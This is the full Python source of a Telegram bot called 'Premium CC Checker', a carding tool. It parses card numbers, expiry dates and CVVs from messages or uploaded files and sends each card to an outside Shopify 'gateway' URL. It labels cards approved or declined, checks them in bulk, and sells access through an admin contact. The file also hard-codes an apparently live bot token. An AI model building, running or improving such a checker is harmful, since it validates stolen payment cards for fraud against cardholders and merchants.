import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
import sys
import logging
from telebot.types import (InlineKeyboardMarkup, InlineKeyboardButton, 
                          ReplyKeyboardMarkup, KeyboardButton)

# Configuration
BOT_TOKEN = "8228704791:AAH85VvWM1HK0-8EEiJKh533Gc3-ul5r-x8"
MAIN_ADMIN_ID = 5103348494
MAX_CARDS_PER_MCHK = 10
GATEWAY_URL = "https://chk-for-shopify.onrender.com"

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def health_check():
    return "💳 Premium CC Checker is Operational", 200

@app.route('/ping')
def ping():
    return "pong", 200

class PremiumCcChecker:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.load_data()
        self.register_handlers()
        
        self.START_MESSAGE = """
╔══💳 *PREMIUM CC CHECKER* 💳══╗
║                              ║
  🔥 *Commands* 🔥  
══════════════════════
🔹 */chk* - Instant Single Card Check
➖ Format: `/chk 4111111111111111|12|2025|123`
➖ Checks cards in 0.5s lightning speed!
📁 */mchk* - Bulk Mass Checker 
➖ Max 10 cards per batch
➖ Supports .txt files with auto-formatting
👑 */auth* - Authorize Users/Groups
➖ Format: `/auth user_id` or `/auth group group_id` (admin only)
══════════════════════
💎 *VIP Access:* 
Contact @mhitzxg for 
⚡ *Elite Membership* ⚡
📊 *Current Status:*
✅ Operational | 🚀 Turbo Mode Enabled
"""
        self.PROCESSING_ANIMATION = [
            "🔍 Analyzing Card Patterns...",
            "🔎 Verifying with Payment Gateways...",
            "🌐 Routing Through Global Nodes...",
            "⚡ Finalizing Transaction Check..."
        ]

    def load_data(self):
        """Load authorized users and admin data"""
        try:
            with open("authorized.json", "r") as f:
                data = json.load(f)
                # Ensure backward compatibility
                if isinstance(data, dict):
                    self.AUTHORIZED_ENTITIES = data
                else:
                    # Migrate old format to new format
                    self.AUTHORIZED_ENTITIES = {
                        "users": {str(k): v for k, v in enumerate(data)},
                        "groups": {}
                    }
        except (FileNotFoundError, json.JSONDecodeError):
            self.AUTHORIZED_ENTITIES = {
                "users": {},
                "groups": {}
            }
            
        try:
            with open("admins.json", "r") as f:
                self.ADMIN_IDS = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.ADMIN_IDS = [MAIN_ADMIN_ID]

    def save_data(self):
        """Save current data to files"""
        with open("authorized.json", "w") as f:
            json.dump(self.AUTHORIZED_ENTITIES, f, indent=4)
        with open("admins.json", "w") as f:
            json.dump(self.ADMIN_IDS, f, indent=4)

    def normalize_card(self, text):
        """
        Extract and format card details from text with improved pattern matching
        Handles various formats including:
        - 4663490004132950|09|26|397|19131|Lakesha Bass|...
        - CCNUM: 4034465129749674 CVV: 029 EXP: 09/2033
        - 4111111111111111 12/25 123
        - 4111 1111 1111 1111 12 2025 123
        """
        if not text:
            return None
            
        # Remove any non-essential characters but keep | and /
        text = re.sub(r'[^\d|/\s]', ' ', text)
        
        # Try to find card number first (13-19 digits, possibly with spaces)
        cc_match = re.search(r'(?:\D|^)(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})(?:\D|$)', text)
        if not cc_match:
            # Try shorter patterns if 16 digits not found
            cc_match = re.search(r'(?:\D|^)(\d{12,19})(?:\D|$)', text)
            if not cc_match:
                return None
                
        cc = cc_match.group(1).replace(' ', '')
        
        # Find expiration - could be MM/YY, MM/YYYY, MM YY, MM|YY, etc.
        exp_match = re.search(r'(\d{1,2})[ /|](\d{2,4})', text)
        if not exp_match:
            return None
            
        mm = exp_match.group(1).zfill(2)
        yy = exp_match.group(2)
        
        # Convert 2-digit year to 4-digit
        if len(yy) == 2:
            yy = '20' + yy if int(yy) < 30 else '19' + yy
        
        # Find CVV - 3 or 4 digits after expiration or card number
        cvv_match = re.search(r'(?:\D|^)(\d{3,4})(?:\D|$)', text[exp_match.end():])
        if not cvv_match:
            # Try to find CVV anywhere in the text if not found after exp
            cvv_match = re.search(r'(?:cvv|security.?code)\D*(\d{3,4})', text, re.I)
            if not cvv_match:
                return None
                
        cvv = cvv_match.group(1)
        
        return f"{cc}|{mm}|{yy}|{cvv}"

    def generate_user_agent(self):
        """Generate random user agent"""
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ])

    def clean_response(self, text):
        """Clean response from any unwanted formatting and escape markdown"""
        text = re.sub(r'<\/?pre>', '', text)
        # Escape markdown special characters
        text = re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', text)
        return text.strip()

    def check_card(self, cc_line):
        """Check card via gateway and return raw response"""
        try:
            url = f"{GATEWAY_URL}?lista={cc_line}"
            headers = {"User-Agent": self.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=20)
            return self.clean_response(response.text)
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return f"❌ Gateway Error: {str(e)}"

    def is_admin(self, user_id):
        return user_id in self.ADMIN_IDS
        
    def is_authorized(self, user_id, chat_id=None):
        if self.is_admin(user_id):
            return True
        
        # Check user authorization
        if str(user_id) in self.AUTHORIZED_ENTITIES.get("users", {}):
            expiry = self.AUTHORIZED_ENTITIES["users"][str(user_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_ENTITIES["users"][str(user_id)]
                self.save_data()
        
        # Check group authorization
        if chat_id and str(chat_id) in self.AUTHORIZED_ENTITIES.get("groups", {}):
            expiry = self.AUTHORIZED_ENTITIES["groups"][str(chat_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_ENTITIES["groups"][str(chat_id)]
                self.save_data()
                
        return False

    def send_unauthorized_message(self, msg):
        self.bot.reply_to(
            msg,
            "🔒 *Access Denied* 🔒\n\n"
            "This is a premium service requiring authorization.\n\n"
            "Contact @mhitzxg for access\n"
            "🆔 Your ID: `{}`".format(msg.from_user.id),
            parse_mode='Markdown'
        )

    def start_mass_check(self, chat_id, cc_lines):
        """Process multiple cards with single updating message"""
        total = len(cc_lines)
        approved = declined = 0
        processing_delay = 1.2  # seconds between checks
        results = []
        
        # Send initial status message
        status_msg = self.bot.send_message(
            chat_id,
            f"""
╔═══════════════════════╗
  📊 *MASS CHECK INITIATED* 📊  
╚═══════════════════════╝
⚡ *Premium CC Checker - V2*
📅 *Date:* {time.strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════
📁 *Total Cards:* `{total}`
✅ *Approved:* `0`
❌ *Declined:* `0`
🔄 *Processing:* `0/{total}`
═══════════════════════
🛡️ *System Status:* `ACTIVE`
🌐 *Gateway:* `PREMIUM SHOPIFY`
            """,
            parse_mode='Markdown'
        )

        def process_cards():
            nonlocal approved, declined
            
            for index, cc in enumerate(cc_lines, 1):
                try:
                    time.sleep(processing_delay)
                    cc_parts = cc.split('|')
                    result = self.check_card(cc)
                    
                    # Determine status
                    if any(x in result for x in ["CHARGED", "CVV MATCH", "APPROVED"]):
                        approved += 1
                        status = "✅ APPROVED ✅"
                    else:
                        declined += 1
                        status = "❌ DECLINED ❌"
                    
                    # Add to results
                    results.append(f"""
💳 *Card {index}:* `{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}`
📊 *Status:* {status}
📝 *Response:* `{result}`
⏱ *Time:* {random.uniform(0.8, 1.5):.2f}s
------------------------------------
""")
                    
                    # Update status message
                    try:
                        self.bot.edit_message_text(
                            f"""
╔═══════════════════════╗
  📊 *MASS CHECK IN PROGRESS* 📊  
╚═══════════════════════╝
⚡ *Premium CC Checker - V2*
📅 *Date:* {time.strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════
📁 *Total Cards:* `{total}`
✅ *Approved:* `{approved}`
❌ *Declined:* `{declined}`
🔄 *Processing:* `{index}/{total}`
═══════════════════════
🛡️ *System Status:* `ACTIVE`
🌐 *Gateway:* `PREMIUM SHOPIFY`
                            """,
                            chat_id,
                            status_msg.message_id,
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Error updating status: {e}")
                    
                except Exception as e:
                    logger.error(f"Error processing card {index}: {e}")
                    results.append(f"""
💳 *Card {index}:* `{cc}`
❌ *Error Processing Card*
⚠️ *Error:* `{str(e)}`
------------------------------------
""")
                    continue
            
            # Final summary with all results
            success_rate = (approved/total)*100 if total > 0 else 0
            try:
                final_message = f"""
╔═══════════════════════╗
  🎉 *MASS CHECK COMPLETE* 🎉  
╚═══════════════════════╝
📈 *Final Statistics:*
═══════════════════════
📁 *Total Cards:* `{total}`
✅ *Approved:* `{approved}` ({success_rate:.2f}%)
❌ *Declined:* `{declined}`
⏱️ *Total Time:* `{total * processing_delay:.2f}s`
═══════════════════════
⚡ *System Shutdown:* `NORMAL`
🕒 *Completed at:* {time.strftime('%H:%M:%S')}
💎 *Thank you for using Premium CC Checker*

═══════════════════════
🔍 *Detailed Results:*
{''.join(results)}
                """
                
                # Split message if too long (Telegram has 4096 char limit)
                if len(final_message) > 4000:
                    part1 = final_message[:4000]
                    part2 = final_message[4000:]
                    self.bot.edit_message_text(
                        part1,
                        chat_id,
                        status_msg.message_id,
                        parse_mode='Markdown'
                    )
                    self.bot.send_message(
                        chat_id,
                        part2,
                        parse_mode='Markdown'
                    )
                else:
                    self.bot.edit_message_text(
                        final_message,
                        chat_id,
                        status_msg.message_id,
                        parse_mode='Markdown'
                    )
            except Exception as e:
                logger.error(f"Error sending final message: {e}")
                # Try sending as a new message if edit fails
                self.bot.send_message(
                    chat_id,
                    f"""
🎉 *MASS CHECK COMPLETE* 🎉
📈 *Final Statistics:*
Total Cards: {total}
Approved: {approved} ({success_rate:.2f}%)
Declined: {declined}
{'═══════════════════════\n'.join(results)}
                    """,
                    parse_mode='Markdown'
                )

        threading.Thread(target=process_cards).start()

    def register_handlers(self):
        """Register all bot command handlers"""
        @self.bot.message_handler(commands=['start', 'help'])
        def start_handler(msg):
            markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            markup.add(
                KeyboardButton('/chk'),
                KeyboardButton('/mchk'),
                KeyboardButton('/auth'),
                KeyboardButton('📞 Contact Admin'),
                KeyboardButton('📊 Bot Status')
            )
            self.bot.send_message(
                msg.chat.id,
                self.START_MESSAGE,
                parse_mode='Markdown',
                reply_markup=markup,
                disable_web_page_preview=True
            )

        @self.bot.message_handler(commands=['chk'])
        def chk_handler(msg):
            chat_id = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else None
            if not self.is_authorized(msg.from_user.id, chat_id):
                return self.send_unauthorized_message(msg)

            cc = None
            if msg.reply_to_message:
                cc = self.normalize_card(msg.reply_to_message.text)
            else:
                args = msg.text.split(None, 1)
                if len(args) > 1:
                    cc = self.normalize_card(args[1]) or args[1]

            if not cc:
                return self.bot.reply_to(
                    msg,
                    "❌ *Invalid Format!*\n\n"
                    "ℹ️ Please use:\n"
                    "`/chk 4111111111111111|12|2025|123`\n\n"
                    "🔍 Or reply to a message containing CC details\n"
                    "Supported formats:\n"
                    "- 4663490004132950|09|26|397|...\n"
                    "- CCNUM: 4034465129749674 CVV: 029 EXP: 09/2033\n"
                    "- 4111 1111 1111 1111 12/25 123",
                    parse_mode='Markdown'
                )

            processing_msg = self.bot.reply_to(
                msg,
                "⚙️ *Initializing Premium Check System...*\n"
                "⚡ Lightning Verification Protocol Activated",
                parse_mode='Markdown'
            )
            
            stop_event = threading.Event()
            def loading_animation():
                for frame in self.PROCESSING_ANIMATION:
                    if stop_event.is_set():
                        return
                    try:
                        self.bot.edit_message_text(
                            frame,
                            msg.chat.id,
                            processing_msg.message_id,
                            parse_mode='Markdown'
                        )
                        time.sleep(1.5)
                    except:
                        break

            threading.Thread(target=loading_animation).start()

            try:
                result = self.check_card(cc)
                stop_event.set()
                
                # Format the response with proper escaping
                response_text = f"""
╔═══════════════════════╗
  💳 *Card Check Complete* 💳  
╚═══════════════════════╝
🔹 *Card:* `{cc}`
📝 *Response:*
`{result}`

🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}
⚡ Powered by Premium CC Checker
"""
                self.bot.edit_message_text(
                    response_text,
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode='Markdown'
                )
                
            except Exception as e:
                stop_event.set()
                self.bot.edit_message_text(
                    f"❌ *System Error* ❌\n\nError: {str(e)}\n\n🛠️ Please try again or contact support",
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode='Markdown'
                )

        @self.bot.message_handler(commands=['mchk'])
        def mchk_handler(msg):
            chat_id = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else None
            if not self.is_authorized(msg.from_user.id, chat_id):
                return self.send_unauthorized_message(msg)

            response_chat = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id

            if not msg.reply_to_message:
                return self.bot.send_message(response_chat, "❌ Reply to a message with CCs or a file.")

            text = ""
            if msg.reply_to_message.document:
                try:
                    file_info = self.bot.get_file(msg.reply_to_message.document.file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    text = downloaded_file.decode("utf-8", errors="ignore")
                except Exception as e:
                    return self.bot.send_message(response_chat, f"❌ File error: {str(e)}")
            else:
                text = msg.reply_to_message.text or ""

            # Extract all possible cards from the text
            cc_lines = []
            for line in text.split('\n'):
                line = line.strip()
                if not line:
                    continue
                    
                # Try to find all cards in the line (supports multiple cards per line)
                card_matches = re.finditer(
                    r'(?:\b|^)(\d{13,19})\b[\s|/]*(\d{1,2})\b[\s|/]*(\d{2,4})\b[\s|/]*(\d{3,4})\b',
                    line
                )
                
                for match in card_matches:
                    cc = match.group(1)
                    mm = match.group(2).zfill(2)
                    yy = match.group(3)
                    cvv = match.group(4)
                    
                    # Convert 2-digit year to 4-digit
                    if len(yy) == 2:
                        yy = '20' + yy if int(yy) < 30 else '19' + yy
                    
                    cc_lines.append(f"{cc}|{mm}|{yy}|{cvv}")
                    if len(cc_lines) >= MAX_CARDS_PER_MCHK:
                        break
                
                # Also try to normalize the entire line as a single card
                if len(cc_lines) < MAX_CARDS_PER_MCHK:
                    norm = self.normalize_card(line)
                    if norm and norm not in cc_lines:
                        cc_lines.append(norm)
                        if len(cc_lines) >= MAX_CARDS_PER_MCHK:
                            break

            if not cc_lines:
                return self.bot.send_message(response_chat, "❌ No valid cards found.")

            if len(text.splitlines()) > MAX_CARDS_PER_MCHK:
                self.bot.send_message(response_chat, f"⚠️ Only first {MAX_CARDS_PER_MCHK} cards will be processed")

            self.start_mass_check(response_chat, cc_lines)

        @self.bot.message_handler(commands=['auth'])
        def auth_handler(msg):
            if not self.is_admin(msg.from_user.id):
                return self.bot.reply_to(msg, "❌ Admin access required!")
            
            args = msg.text.split()
            if len(args) < 2:
                return self.bot.reply_to(msg, "Usage: /auth user_id OR /auth group group_id")
            
            # Group authorization
            if len(args) >= 3 and args[1].lower() == "group":
                try:
                    group_id = int(args[2])
                    # Telegram group IDs are negative
                    if group_id > 0:
                        group_id = -group_id
                    
                    # Initialize groups dictionary if it doesn't exist
                    if "groups" not in self.AUTHORIZED_ENTITIES:
                        self.AUTHORIZED_ENTITIES["groups"] = {}
                    
                    self.AUTHORIZED_ENTITIES["groups"][str(group_id)] = "forever"
                    self.save_data()
                    
                    return self.bot.reply_to(
                        msg,
                        f"✅ Successfully authorized group {group_id}\n"
                        f"Access granted: Permanent\n"
                        f"Current authorized groups: {len(self.AUTHORIZED_ENTITIES.get('groups', {}))}",
                        parse_mode='Markdown'
                    )
                except ValueError:
                    return self.bot.reply_to(msg, "❌ Invalid group ID format! Must be a number.")
            
            # User authorization
            try:
                user_id = int(args[1])
                # Initialize users dictionary if it doesn't exist
                if "users" not in self.AUTHORIZED_ENTITIES:
                    self.AUTHORIZED_ENTITIES["users"] = {}
                
                self.AUTHORIZED_ENTITIES["users"][str(user_id)] = "forever"
                self.save_data()
                
                self.bot.reply_to(
                    msg,
                    f"✅ Successfully authorized user {user_id}\n"
                    f"Access granted: Permanent\n"
                    f"Current authorized users: {len(self.AUTHORIZED_ENTITIES.get('users', {}))}",
                    parse_mode='Markdown'
                )
            except ValueError:
                return self.bot.reply_to(msg, "❌ Invalid user ID format! Must be a number.")

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    bot = PremiumCcChecker()
    logger.info("🚀 Starting Premium CC Checker Bot")
    bot.bot.polling(none_stop=True)

if __name__ == '__main__':
    main()
